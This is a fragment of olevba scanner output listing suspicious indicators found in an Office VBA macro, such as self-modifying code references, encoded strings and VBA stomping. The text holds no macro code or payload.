|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

